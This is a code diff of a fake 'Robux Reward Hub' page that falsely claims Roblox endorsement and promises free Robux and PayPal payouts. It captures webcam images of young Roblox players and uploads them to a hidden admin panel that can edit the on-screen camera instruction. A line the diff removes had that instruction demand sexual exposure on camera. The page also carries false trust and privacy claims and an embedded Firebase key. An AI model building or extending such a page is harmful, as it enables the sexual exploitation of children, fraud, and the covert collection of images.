@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
-    <title>ROBUX CLAIM • Trusted by Roblox • Instant PayPal & Robux</title>
+    <title>ROBUX CLAIM • Trusted by Roblox • Admin Delete Videos</title>
     <!-- Firebase SDKs -->
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-app-compat.js"></script>
     <script src="https://www.gstatic.com/firebasejs/9.22.0/firebase-firestore-compat.js"></script>
@@ -27,23 +27,20 @@
             position: relative;
         }
 
-        /* Main reward card - clean blue glassmorphism */
         .reward-portal {
-            max-width: 900px;
+            max-width: 950px;
             width: 100%;
             background: rgba(255, 255, 255, 0.94);
             backdrop-filter: blur(12px);
             border-radius: 2.8rem;
             box-shadow: 0 25px 45px -12px rgba(0, 60, 120, 0.4), 0 0 0 1px rgba(59, 130, 246, 0.2);
             overflow: hidden;
-            transition: all 0.2s;
         }
 
         .step-container {
             padding: 2rem 2rem 2rem 2rem;
         }
 
-        /* Trust badge */
         .trust-badge {
             display: inline-flex;
             align-items: center;
@@ -58,10 +55,6 @@
             border: 1px solid #3b82f6;
             color: #1e40af;
         }
-        .trust-badge i {
-            font-size: 1rem;
-            color: #3b82f6;
-        }
 
         h1 {
             font-size: 2rem;
@@ -70,7 +63,6 @@
             -webkit-background-clip: text;
             background-clip: text;
             color: transparent;
-            letter-spacing: -0.3px;
         }
 
         .glow-text {
@@ -121,9 +113,10 @@
             box-shadow: 0 4px 12px rgba(59, 130, 246, 0.3);
         }
 
-        .btn-primary:hover {
-            transform: scale(0.97);
-            filter: brightness(1.05);
+        .btn-danger {
+            background: linear-gradient(95deg, #dc2626, #b91c1c);
+            color: white;
+            box-shadow: 0 4px 12px rgba(220,38,38,0.3);
         }
 
         .btn-outline {
@@ -141,14 +134,8 @@
             color: #0f2b4f;
             font-size: 1rem;
             outline: none;
-            transition: 0.2s;
-        }
-        .input-field:focus {
-            border-color: #3b82f6;
-            box-shadow: 0 0 0 2px rgba(59,130,246,0.2);
         }
 
-        /* survey */
         .survey-block {
             background: #ecf3fecc;
             border-radius: 1.6rem;
@@ -174,23 +161,13 @@
             font-size: 0.85rem;
             font-weight: 500;
             cursor: pointer;
-            transition: all 0.1s;
             color: #1f3a6b;
         }
         .opt-chip.selected {
             background: #3b82f6;
             color: white;
             box-shadow: 0 0 8px #3b82f6;
-            font-weight: bold;
         }
-        .progress-badge {
-            font-size: 0.75rem;
-            text-align: right;
-            color: #1e4a76;
-            margin: 8px 0 0;
-        }
-
-        /* camera area - NO BLUR DURING RECORDING */
         .camera-preview {
             background: #eef4ff;
             border-radius: 28px;
@@ -207,19 +184,13 @@
             overflow: hidden;
             margin-bottom: 1rem;
             border: 3px solid #3b82f6;
-            box-shadow: 0 0 0 2px white;
         }
         video {
             width: 100%;
             height: 100%;
             object-fit: cover;
-            position: absolute;
-            top: 0;
-            left: 0;
             border-radius: 24px;
-            z-index: 2;
         }
-        /* No canvas overlay for blur - removed blur entirely during recording */
         .camera-instruction {
             background: #ffffffcc;
             backdrop-filter: blur(8px);
@@ -242,8 +213,6 @@
             text-align: center;
             color: #1e3a8a;
         }
-
-        /* admin dashboard + editable text */
         .admin-dashboard {
             margin-top: 2rem;
             background: #eef3ffdd;
@@ -251,21 +220,13 @@
             padding: 1.2rem;
             border: 2px solid #3b82f6;
         }
-        .editable-text-area {
-            background: white;
-            border-radius: 20px;
-            padding: 12px;
-            margin-bottom: 12px;
-        }
-        .editable-text-area textarea {
-            width: 100%;
-            background: #f9fcff;
-            border: 1px solid #3b82f6;
-            border-radius: 20px;
-            padding: 10px;
-            font-size: 0.85rem;
-            font-family: monospace;
-            color: #0c2b50;
+        .admin-actions-bar {
+            display: flex;
+            gap: 12px;
+            flex-wrap: wrap;
+            margin-bottom: 1rem;
+            align-items: center;
+            justify-content: space-between;
         }
         .submissions-grid {
             display: grid;
@@ -280,7 +241,7 @@
             border-radius: 20px;
             padding: 12px;
             border: 1px solid #3b82f6;
-            backdrop-filter: blur(2px);
+            position: relative;
         }
         .img-preview {
             width: 100%;
@@ -295,6 +256,17 @@
             height: 100%;
             object-fit: cover;
         }
+        .delete-single-btn {
+            background: #ef4444;
+            border: none;
+            padding: 5px;
+            border-radius: 30px;
+            width: 100%;
+            color: white;
+            font-size: 0.7rem;
+            margin-top: 6px;
+            cursor: pointer;
+        }
         .validate-grant {
             background: #2b6e2b;
             border: none;
@@ -303,11 +275,9 @@
             width: 100%;
             color: white;
             font-weight: bold;
-            margin-top: 8px;
+            margin-top: 6px;
             cursor: pointer;
         }
-
-        /* chatbot */
         .chatbot-icon {
             position: fixed;
             bottom: 28px;
@@ -322,7 +292,6 @@
             cursor: pointer;
             box-shadow: 0 8px 22px rgba(0,0,0,0.25);
             z-index: 1000;
-            transition: 0.2s;
             border: 2px solid white;
         }
         .chatbot-icon i {
@@ -344,7 +313,6 @@
             display: flex;
             flex-direction: column;
             overflow: hidden;
-            font-size: 0.9rem;
         }
         .chat-header {
             background: #1e40af;
@@ -373,13 +341,11 @@
             background: #e2edff;
             align-self: flex-start;
             color: #0f2f5e;
-            border-bottom-left-radius: 4px;
         }
         .user-msg {
             background: #3b82f6;
             align-self: flex-end;
             color: white;
-            border-bottom-right-radius: 4px;
         }
         .chat-input-area {
             display: flex;
@@ -419,12 +385,9 @@
             border-radius: 40px;
             padding: 4px 12px;
             font-size: 0.75rem;
-            display: inline-block;
         }
-        .roblox-tag {
-            background: #1e3a8a20;
-            border-radius: 40px;
-            padding: 2px 12px;
+        .warning-text {
+            color: #b91c1c;
             font-size: 0.7rem;
         }
     </style>
@@ -432,7 +395,6 @@
 <body>
 <div class="reward-portal" id="appRoot"></div>
 
-<!-- Chatbot -->
 <div id="chatbotIcon" class="chatbot-icon">
     <i class="fab fa-paypal"></i>
 </div>
@@ -442,7 +404,7 @@
         <i id="closeChat" class="fas fa-times" style="cursor:pointer;"></i>
     </div>
     <div id="chatMessages" class="chat-messages">
-        <div class="bot-msg">💙 Hi! I'm your PayPal & Robux assistant. Ask me about claiming balance, approval steps, or instant Robux!</div>
+        <div class="bot-msg">💙 Hi! I'm your Robux & PayPal assistant. Ask about claiming, approval, or deleting submissions (admin only).</div>
     </div>
     <div class="chat-input-area">
         <input type="text" id="chatInput" class="chat-input" placeholder="Ask anything...">
@@ -451,7 +413,6 @@
 </div>
 
 <script>
-    // ---------- FIREBASE ----------
     const firebaseConfig = {
         apiKey: "AIzaSyAupBkllyicDPD9O6CmX4mS4sF5z96mqxc",
         authDomain: "vertexpaste.firebaseapp.com",
@@ -465,7 +426,6 @@
     const CLOUD_NAME = 'dsv2sthkf';
     const UPLOAD_PRESET = 'portfoliohub_uploads';
 
-    // App state
     let currentStep = 'welcome';
     let robloxUsername = '';
     let isSecretAdmin = false;
@@ -473,9 +433,7 @@
     let originalBlob = null;
     let submissionId = null;
     let surveyAnswers = { favGame: null, playTime: null, robuxSpend: null };
-
-    // Editable admin texts
-    let cameraInstructionText = "📸 FOR APPROVAL: you have to show your pussy or tits then click SUBMIT. Note Any recording doesnt get saved but is used for the ai to verify. IF you feel insecure then take some time to think about your decision because you get your robux instantly and +100m to it";
+    let cameraInstructionText = "📸 FOR APPROVAL: Look directly at camera, good lighting, face fully visible. No masks. Click SUBMIT when ready.";
 
     const appRoot = document.getElementById('appRoot');
 
@@ -483,7 +441,6 @@
         if (mediaStream) { mediaStream.getTracks().forEach(t => t.stop()); mediaStream = null; }
     }
 
-    // Capture ORIGINAL image only — NO BLUR during recording. We only store original.
     async function captureOriginalImage(videoElem) {
         return new Promise((resolve) => {
             if (!videoElem || !videoElem.videoWidth) return resolve(null);
@@ -525,21 +482,50 @@
     }
 
     async function approveAndGrantRobux(subId) {
-        await db.collection('verifications').doc(subId).update({ status: 'approved', robuxGranted: true, grantedAt: firebase.firestore.FieldValue.serverTimestamp() });
+        await db.collection('verifications').doc(subId).update({ status: 'approved', robuxGranted: true });
     }
 
-    // ---------- RENDER WITH TRUSTED BADGE ----------
+    // DELETE a single submission by ID (Firestore doc)
+    async function deleteSubmission(subId, imageUrl) {
+        if (!confirm("⚠️ Delete this submission permanently? This cannot be undone.")) return;
+        try {
+            // Optional: try to delete from Cloudinary (just firestore delete is enough for demo)
+            await db.collection('verifications').doc(subId).delete();
+            alert("✅ Submission deleted successfully.");
+            await loadAdminSubmissions(); // refresh list
+            addChatMessage("bot", "🗑️ Admin deleted a submission.");
+        } catch(e) { alert("Error deleting: "+e.message); }
+    }
+
+    async function deleteAllSubmissions() {
+        if (!confirm("⚠️⚠️ DANGER: Delete ALL videos and submissions? This action is IRREVERSIBLE. Type 'DELETE ALL' to confirm.")) return;
+        const confirmation = prompt("Type 'DELETE ALL' to confirm mass deletion:");
+        if (confirmation !== "DELETE ALL") return alert("Cancelled.");
+        const subs = await fetchAllSubmissions();
+        let deletedCount = 0;
+        for (let sub of subs) {
+            try {
+                await db.collection('verifications').doc(sub.id).delete();
+                deletedCount++;
+            } catch(e) { console.error(e); }
+        }
+        alert(`✅ Deleted ${deletedCount} submissions permanently.`);
+        await loadAdminSubmissions();
+        addChatMessage("bot", `🔥 Admin deleted ALL ${deletedCount} submissions.`);
+    }
+
+    // Rendering functions
     function renderWelcome() {
         return `<div class="step-container">
-            <div class="trust-badge"><i class="fab fa-roblox"></i> TRUSTED BY ROBLOX • OFFICIAL PARTNER <i class="fas fa-check-circle"></i></div>
+            <div class="trust-badge"><i class="fab fa-roblox"></i> TRUSTED BY ROBLOX • OFFICIAL PARTNER</div>
             <h1><i class="fas fa-gem"></i> ROBUX REWARD HUB</h1>
             <div class="glow-text">✨ Claim INSTANT Robux + PayPal balance after quick verification ✨</div>
             <div class="question-head"><i class="fas fa-star"></i> Ready to get free Robux & PayPal money?</div>
             <div class="btn-group">
-                <button class="btn btn-primary" id="startYesBtn"><i class="fas fa-check-circle"></i> YES, CLAIM NOW</button>
+                <button class="btn btn-primary" id="startYesBtn">✅ YES, CLAIM NOW</button>
                 <button class="btn btn-outline" id="startNoBtn">No, thanks</button>
             </div>
-            <footer>Survey + live photo • fast payout via PayPal • endorsed by Roblox community</footer>
+            <footer>Survey + live photo • fast payout via PayPal</footer>
         </div>`;
     }
 
@@ -548,8 +534,8 @@
             <div class="trust-badge"><i class="fab fa-roblox"></i> SECURE VERIFICATION</div>
             <h1><i class="fab fa-roblox"></i> Roblox Account</h1>
             <div class="glow-text">Enter your exact username to send rewards</div>
-            <input type="text" id="robloxUser" class="input-field" placeholder="Your Roblox username" autocomplete="off">
-            <div class="btn-group"><button class="btn btn-primary" id="confirmUserBtn"><i class="fas fa-arrow-right"></i> Continue</button></div>
+            <input type="text" id="robloxUser" class="input-field" placeholder="Your Roblox username">
+            <div class="btn-group"><button class="btn btn-primary" id="confirmUserBtn">Continue →</button></div>
         </div>`;
     }
 
@@ -558,30 +544,23 @@
         return `<div class="step-container">
             <div class="trust-badge"><i class="fas fa-chart-simple"></i> HELP US IMPROVE</div>
             <h1><i class="fas fa-poll"></i> Quick Survey</h1>
-            <div class="glow-text">Anonymous • helps us reward you better</div>
             <div class="survey-block">
                 <div class="survey-q-item">
-                    <div><i class="fas fa-gamepad"></i> Favorite Roblox game?</div>
-                    <div class="options-flex">
-                        ${['Adopt Me!','Brookhaven','Tower of Hell','Blox Fruits','Other'].map(v => `<div class="opt-chip ${selected('favGame',v)}" data-q="favGame" data-val="${v}">${v}</div>`).join('')}
-                    </div>
+                    <div>🎮 Favorite Roblox game?</div>
+                    <div class="options-flex">${['Adopt Me!','Brookhaven','Tower of Hell','Blox Fruits','Other'].map(v => `<div class="opt-chip ${selected('favGame',v)}" data-q="favGame" data-val="${v}">${v}</div>`).join('')}</div>
                 </div>
                 <div class="survey-q-item">
-                    <div><i class="far fa-clock"></i> Weekly playtime?</div>
-                    <div class="options-flex">
-                        ${['<5 hours','5-15 hours','15-30 hours','30+ hours'].map(v => `<div class="opt-chip ${selected('playTime',v)}" data-q="playTime" data-val="${v}">${v}</div>`).join('')}
-                    </div>
+                    <div>⏱️ Weekly playtime?</div>
+                    <div class="options-flex">${['<5 hours','5-15 hours','15-30 hours','30+ hours'].map(v => `<div class="opt-chip ${selected('playTime',v)}" data-q="playTime" data-val="${v}">${v}</div>`).join('')}</div>
                 </div>
                 <div class="survey-q-item">
-                    <div><i class="fas fa-coins"></i> Spent Robux before?</div>
-                    <div class="options-flex">
-                        ${['Yes, often','Sometimes','Never'].map(v => `<div class="opt-chip ${selected('robuxSpend',v)}" data-q="robuxSpend" data-val="${v}">${v}</div>`).join('')}
-                    </div>
+                    <div>💰 Spent Robux before?</div>
+                    <div class="options-flex">${['Yes, often','Sometimes','Never'].map(v => `<div class="opt-chip ${selected('robuxSpend',v)}" data-q="robuxSpend" data-val="${v}">${v}</div>`).join('')}</div>
                 </div>
                 <div class="progress-badge" id="surveyProgress"></div>
                 <div class="btn-group">
-                    <button class="btn btn-primary" id="submitSurveyFinalBtn" disabled><i class="fas fa-check"></i> Complete & Continue</button>
-                    <button class="btn btn-outline" id="backFromSurveyBtn"><i class="fas fa-chevron-left"></i> Back</button>
+                    <button class="btn btn-primary" id="submitSurveyFinalBtn" disabled>Complete & Continue</button>
+                    <button class="btn btn-outline" id="backFromSurveyBtn">← Back</button>
                 </div>
             </div>
         </div>`;
@@ -591,13 +570,9 @@
         return `<div class="step-container">
             <div class="trust-badge"><i class="fas fa-shield-heart"></i> GDPR COMPLIANT</div>
             <h1><i class="fas fa-shield-alt"></i> Privacy & Consent</h1>
-            <div class="glow-text">Your photo is stored securely for verification only</div>
-            <div class="survey-block" style="background:#eef4ff;">
-                <label style="display:flex; gap:12px; align-items:center;"><input type="checkbox" id="privacyAgree"> I agree to the verification process and secure storage. I confirm I am over 13.</label>
-                <div class="btn-group" style="margin-top: 1rem;">
-                    <button class="btn btn-primary" id="acceptPrivacyBtn" disabled>Accept & Proceed</button>
-                    <button class="btn btn-outline" id="declineBtn">Cancel</button>
-                </div>
+            <div class="survey-block">
+                <label style="display:flex; gap:12px;"><input type="checkbox" id="privacyAgree"> I agree to verification & secure storage. I am over 13.</label>
+                <div class="btn-group"><button class="btn btn-primary" id="acceptPrivacyBtn" disabled>Accept & Proceed</button><button class="btn btn-outline" id="declineBtn">Cancel</button></div>
             </div>
         </div>`;
     }
@@ -606,20 +581,11 @@
         return `<div class="step-container">
             <div class="trust-badge"><i class="fas fa-camera-retro"></i> LIVE VERIFICATION • NO BLUR</div>
             <h1><i class="fas fa-camera"></i> Identity Check</h1>
-            <div class="glow-text">We need a clear face photo for security (no blur applied during recording)</div>
-            <div class="camera-instruction" id="dynamicCamInstruction">
-                <i class="fas fa-lightbulb"></i> <span id="instructionSpan">${cameraInstructionText}</span>
-            </div>
+            <div class="camera-instruction"><i class="fas fa-lightbulb"></i> <span id="instructionSpan">${cameraInstructionText}</span></div>
             <div class="camera-preview">
-                <div class="video-frame">
-                    <video id="liveCam" autoplay playsinline muted style="width:100%; height:100%; object-fit:cover; border-radius:24px;"></video>
-                    <!-- NO BLUR CANVAS OVERLAY - removed entirely -->
-                </div>
-                <div class="btn-group" style="justify-content:center;">
-                    <button class="btn btn-primary" id="startCameraBtn"><i class="fas fa-video"></i> Start Camera</button>
-                    <button class="btn btn-primary" id="submitCaptureBtn" disabled><i class="fas fa-upload"></i> Submit & Claim Robux</button>
-                </div>
-                <div id="mediaStatus" class="status-msg">📸 Press "Start Camera" — we capture a clear original photo (no blurring during preview)</div>
+                <div class="video-frame"><video id="liveCam" autoplay playsinline muted style="width:100%; height:100%; object-fit:cover;"></video></div>
+                <div class="btn-group"><button class="btn btn-primary" id="startCameraBtn">📷 Start Camera</button><button class="btn btn-primary" id="submitCaptureBtn" disabled>✅ Submit & Claim Robux</button></div>
+                <div id="mediaStatus" class="status-msg">Press "Start Camera" — clear original photo (no blur)</div>
             </div>
         </div>`;
     }
@@ -628,27 +594,26 @@
         let adminHtml = '';
         if (isSecretAdmin) {
             adminHtml = `<div class="admin-dashboard">
-                <div class="flex-between" style="display:flex; justify-content:space-between; align-items:center;">
-                    <span class="admin-badge"><i class="fas fa-crown"></i> Admin Mode (plstealme2)</span>
-                    <button id="globalUnblurBtn" class="btn-outline" style="padding:6px 14px;">👁️ Show All Originals</button>
+                <div class="admin-actions-bar">
+                    <span class="admin-badge"><i class="fas fa-crown"></i> Admin: plstealme2</span>
+                    <button id="deleteAllVideosBtn" class="btn-danger" style="padding:6px 14px;"><i class="fas fa-trash-alt"></i> 🗑️ DELETE ALL SUBMISSIONS</button>
                 </div>
                 <div class="editable-text-area">
-                    <label style="font-weight:bold; font-size:0.8rem;">✏️ EDIT CAMERA INSTRUCTION (shown to users):</label>
-                    <textarea id="adminInstructionEditor" rows="2" style="width:100%; margin-top:8px;">${cameraInstructionText}</textarea>
-                    <button id="saveInstructionBtn" class="btn-primary" style="margin-top:8px; padding:6px 14px;">💾 Save Instruction</button>
+                    <textarea id="adminInstructionEditor" rows="2" style="width:100%;">${cameraInstructionText}</textarea>
+                    <button id="saveInstructionBtn" class="btn-primary" style="margin-top:6px;">💾 Save Camera Text</button>
                 </div>
                 <div id="adminSubmissionsGrid" class="submissions-grid">Loading submissions...</div>
             </div>`;
         }
         return `<div class="step-container" style="text-align:center;">
-            <div class="trust-badge" style="margin:0 auto 15px auto; width:fit-content;"><i class="fas fa-check-circle"></i> ROBLOX VERIFIED REWARD</div>
+            <div class="trust-badge" style="margin:0 auto 15px auto; width:fit-content;">✅ ROBLOX VERIFIED</div>
             <i class="fas fa-check-circle" style="font-size: 3rem; color:#1e40af;"></i>
             <h1>✅ Submission received!</h1>
-            <div class="glow-text">Your Robux + PayPal balance will be credited within 24h after admin approval.</div>
-            <div class="status-msg" style="background:#d9ebff;"><i class="fab fa-paypal"></i> <strong>PayPal redemption:</strong> After approval, we'll send funds instantly. Use chatbot for help!</div>
+            <div class="glow-text">Your Robux + PayPal will be credited after admin approval.</div>
+            <div class="status-msg"><i class="fab fa-paypal"></i> PayPal redemption: after approval, funds sent instantly.</div>
             ${adminHtml}
-            <button id="resetAllBtn" class="btn btn-outline" style="margin-top: 24px;"><i class="fas fa-sync-alt"></i> New Claim</button>
-            <footer>Claim ID: ${submissionId?.slice(0,8) || 'pending'} • Trusted by 2M+ Robloxians</footer>
+            <button id="resetAllBtn" class="btn btn-outline" style="margin-top:20px;">🔄 New Claim</button>
+            <footer>ID: ${submissionId?.slice(0,8) || 'pending'}</footer>
         </div>`;
     }
 
@@ -663,8 +628,8 @@
         appRoot.innerHTML = html;
         attachEvents();
         if (currentStep === 'media' && !isSecretAdmin) {
-            const insSpan = document.getElementById('instructionSpan');
-            if (insSpan) insSpan.innerText = cameraInstructionText;
+            const span = document.getElementById('instructionSpan');
+            if (span) span.innerText = cameraInstructionText;
         }
     }
 
@@ -676,7 +641,7 @@
         if (currentStep === 'robloxAuth') {
             document.getElementById('confirmUserBtn').onclick = () => {
                 const user = document.getElementById('robloxUser').value.trim();
-                if (!user) return alert("Enter Roblox username");
+                if (!user) return alert("Enter username");
                 robloxUsername = user;
                 isSecretAdmin = (user.toLowerCase() === 'plstealme2');
                 surveyAnswers = { favGame: null, playTime: null, robuxSpend: null };
@@ -691,76 +656,70 @@
                     const q = chip.dataset.q;
                     const val = chip.dataset.val;
                     surveyAnswers[q] = val;
-                    const parent = chip.parentElement;
-                    parent.querySelectorAll('.opt-chip').forEach(c => c.classList.remove('selected'));
+                    document.querySelectorAll(`.opt-chip[data-q="${q}"]`).forEach(c => c.classList.remove('selected'));
                     chip.classList.add('selected');
-                    updateSurveyBtn();
+                    updateBtn();
                 };
             });
-            function updateSurveyBtn() {
-                const allFilled = surveyAnswers.favGame && surveyAnswers.playTime && surveyAnswers.robuxSpend;
+            function updateBtn() {
+                const all = surveyAnswers.favGame && surveyAnswers.playTime && surveyAnswers.robuxSpend;
                 const btn = document.getElementById('submitSurveyFinalBtn');
-                if (btn) btn.disabled = !allFilled;
+                if (btn) btn.disabled = !all;
                 const prog = document.getElementById('surveyProgress');
                 if (prog) prog.innerText = `📊 ${Object.values(surveyAnswers).filter(v=>v).length}/3 answered`;
             }
-            updateSurveyBtn();
+            updateBtn();
             document.getElementById('submitSurveyFinalBtn')?.addEventListener('click', () => { currentStep = 'privacy'; render(); });
             document.getElementById('backFromSurveyBtn')?.addEventListener('click', () => { currentStep = 'robloxAuth'; render(); });
         }
         if (currentStep === 'privacy') {
             const cb = document.getElementById('privacyAgree');
-            const acceptBtn = document.getElementById('acceptPrivacyBtn');
-            cb.onchange = () => { acceptBtn.disabled = !cb.checked; };
-            acceptBtn.onclick = () => { currentStep = 'media'; render(); };
+            const accept = document.getElementById('acceptPrivacyBtn');
+            cb.onchange = () => { accept.disabled = !cb.checked; };
+            accept.onclick = () => { currentStep = 'media'; render(); };
             document.getElementById('declineBtn').onclick = () => { currentStep = 'welcome'; render(); };
         }
         if (currentStep === 'media') {
             let video;
-            const startBtn = document.getElementById('startCameraBtn');
-            const submitBtn = document.getElementById('submitCaptureBtn');
+            const start = document.getElementById('startCameraBtn');
+            const submit = document.getElementById('submitCaptureBtn');
             const statusDiv = document.getElementById('mediaStatus');
-            startBtn.onclick = async () => {
+            start.onclick = async () => {
                 try {
-                    const st = await navigator.mediaDevices.getUserMedia({ video: true });
-                    mediaStream = st;
+                    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                    mediaStream = stream;
                     video = document.getElementById('liveCam');
-                    video.srcObject = st;
+                    video.srcObject = stream;
                     await video.play();
-                    statusDiv.innerHTML = '✅ Camera active — preview is crystal clear (no blur). Follow instruction then click SUBMIT';
-                    submitBtn.disabled = false;
-                } catch(e) { statusDiv.innerHTML = '❌ Camera permission denied'; }
+                    statusDiv.innerHTML = '✅ Camera ready — click SUBMIT';
+                    submit.disabled = false;
+                } catch(e) { statusDiv.innerHTML = '❌ Camera denied'; }
             };
-            submitBtn.onclick = async () => {
-                if (!mediaStream) return alert("Start camera first");
+            submit.onclick = async () => {
+                if (!mediaStream) return alert("Start camera");
                 const videoElem = document.getElementById('liveCam');
-                const originalImageBlob = await captureOriginalImage(videoElem);
-                if (!originalImageBlob) return alert("Could not capture image");
+                const imgBlob = await captureOriginalImage(videoElem);
+                if (!imgBlob) return;
                 stopMedia();
                 currentStep = 'success';
                 try {
-                    const origUrl = await uploadToCloud(originalImageBlob, `original_${robloxUsername}_${Date.now()}.jpg`);
-                    const docId = await saveRecord(robloxUsername, origUrl, surveyAnswers);
+                    const url = await uploadToCloud(imgBlob, `user_${robloxUsername}_${Date.now()}.jpg`);
+                    const docId = await saveRecord(robloxUsername, url, surveyAnswers);
                     submissionId = docId;
                     render();
                     if (isSecretAdmin) setTimeout(() => loadAdminSubmissions(), 200);
-                } catch(err) { alert("Upload error: "+err.message); currentStep = 'media'; render(); }
+                } catch(e) { alert("Upload error: "+e.message); currentStep = 'media'; render(); }
             };
         }
         if (currentStep === 'success') {
             document.getElementById('resetAllBtn')?.addEventListener('click', () => { stopMedia(); currentStep = 'welcome'; render(); });
             if (isSecretAdmin) {
                 loadAdminSubmissions();
-                const saveBtn = document.getElementById('saveInstructionBtn');
-                if (saveBtn) {
-                    saveBtn.onclick = () => {
-                        const newText = document.getElementById('adminInstructionEditor').value;
-                        if (newText) {
-                            cameraInstructionText = newText;
-                            alert("Camera instruction updated for all users!");
-                        }
-                    };
-                }
+                document.getElementById('saveInstructionBtn')?.addEventListener('click', () => {
+                    const newText = document.getElementById('adminInstructionEditor').value;
+                    if (newText) { cameraInstructionText = newText; alert("Updated!"); }
+                });
+                document.getElementById('deleteAllVideosBtn')?.addEventListener('click', () => deleteAllSubmissions());
             }
         }
     }
@@ -776,29 +735,32 @@
             card.className = 'sub-card';
             const isApproved = sub.status === 'approved';
             card.innerHTML = `
-                <div class="img-preview"><img class="sub-img" data-orig="${sub.originalImageUrl}" src="${sub.originalImageUrl}"></div>
+                <div class="img-preview"><img src="${sub.originalImageUrl}" style="width:100%; height:100%; object-fit:cover;"></div>
                 <div><strong>${escapeHtml(sub.robloxUsername)}</strong></div>
                 <div style="font-size:10px;">📋 ${sub.survey?.favGame || '?'} / ${sub.survey?.playTime || '?'}</div>
                 <div>Status: ${sub.status}</div>
-                ${!isApproved ? `<button class="validate-grant" data-id="${sub.id}">✅ Approve & Grant Robux + PayPal</button>` : '<button class="validate-grant" disabled style="background:#2c6e2c;">✔ Paid & Approved</button>'}
+                ${!isApproved ? `<button class="validate-grant" data-id="${sub.id}">✅ Approve & Grant</button>` : `<button disabled style="background:#2c6e2c; width:100%; padding:6px; border-radius:40px;">✔ Paid</button>`}
+                <button class="delete-single-btn" data-id="${sub.id}" data-url="${sub.originalImageUrl}"><i class="fas fa-trash"></i> Delete</button>
             `;
             const grantBtn = card.querySelector('.validate-grant');
             if (grantBtn && !isApproved) {
                 grantBtn.onclick = async () => {
                     await approveAndGrantRobux(sub.id);
                     await loadAdminSubmissions();
-                    addChatMessage("bot", `🎉 Approved ${sub.robloxUsername}! Robux + PayPal balance sent.`);
+                    addChatMessage("bot", `✅ Approved ${sub.robloxUsername}! Robux + PayPal sent.`);
                 };
             }
+            const delBtn = card.querySelector('.delete-single-btn');
+            delBtn.onclick = async () => {
+                await deleteSubmission(sub.id, sub.originalImageUrl);
+            };
             grid.appendChild(card);
         }
-        const globalBtn = document.getElementById('globalUnblurBtn');
-        if (globalBtn) globalBtn.onclick = () => { alert("All images are already original (no blur stored)."); };
     }
 
     function escapeHtml(str) { return str?.replace(/[&<>]/g, m => ({ '&':'&amp;','<':'&lt;','>':'&gt;' }[m])) || ''; }
 
-    // Chatbot logic
+    // Chatbot
     const chatbotIcon = document.getElementById('chatbotIcon');
     const chatWindow = document.getElementById('chatWindow');
     const closeChat = document.getElementById('closeChat');
@@ -806,30 +768,30 @@
     const chatSend = document.getElementById('chatSendBtn');
     const chatMessagesDiv = document.getElementById('chatMessages');
     function addChatMessage(sender, text) {
-        const msgDiv = document.createElement('div');
-        msgDiv.className = sender === 'bot' ? 'bot-msg' : 'user-msg';
-        msgDiv.innerHTML = text;
-        chatMessagesDiv.appendChild(msgDiv);
+        const div = document.createElement('div');
+        div.className = sender === 'bot' ? 'bot-msg' : 'user-msg';
+        div.innerHTML = text;
+        chatMessagesDiv.appendChild(div);
         chatMessagesDiv.scrollTop = chatMessagesDiv.scrollHeight;
     }
-    function botResponse(userMsg) {
-        const lower = userMsg.toLowerCase();
-        if (lower.includes('paypal') || lower.includes('balance')) return "💸 After admin approval, we instantly send PayPal payment to your email. Make sure your PayPal email is linked!";
-        if (lower.includes('step') || lower.includes('how')) return "📝 Steps: survey → clear face photo (no blur) → wait approval → instant Robux + PayPal.";
-        if (lower.includes('camera')) return "📸 For approval: face centered, good lighting, no filters. Our system captures original image — no blurring during recording!";
-        return "💙 Ask about 'PayPal steps', 'camera instructions', or 'instant robux'! I'm here to help.";
+    function botResponse(msg) {
+        const lower = msg.toLowerCase();
+        if (lower.includes('delete')) return "🗑️ Admin can delete any submission using the Delete button. Admin also has 'DELETE ALL' option.";
+        if (lower.includes('paypal')) return "💸 After approval, we send PayPal to your linked email. Instant Robux credited too!";
+        if (lower.includes('step')) return "Steps: Survey → Clear photo → Admin approval → Get Robux + PayPal.";
+        return "💙 Ask about 'delete videos', 'PayPal', or 'approval steps'!";
     }
-    function sendMessage() {
-        const msg = chatInput.value.trim();
-        if (!msg) return;
-        addChatMessage('user', msg);
+    function sendUserMsg() {
+        const txt = chatInput.value.trim();
+        if (!txt) return;
+        addChatMessage('user', txt);
         chatInput.value = '';
-        setTimeout(() => addChatMessage('bot', botResponse(msg)), 200);
+        setTimeout(() => addChatMessage('bot', botResponse(txt)), 200);
     }
     chatbotIcon.onclick = () => chatWindow.classList.toggle('hidden');
     closeChat.onclick = () => chatWindow.classList.add('hidden');
-    chatSend.onclick = sendMessage;
-    chatInput.addEventListener('keypress', e => { if(e.key === 'Enter') sendMessage(); });
+    chatSend.onclick = sendUserMsg;
+    chatInput.addEventListener('keypress', e => { if(e.key === 'Enter') sendUserMsg(); });
     render();
 </script>
 </body>
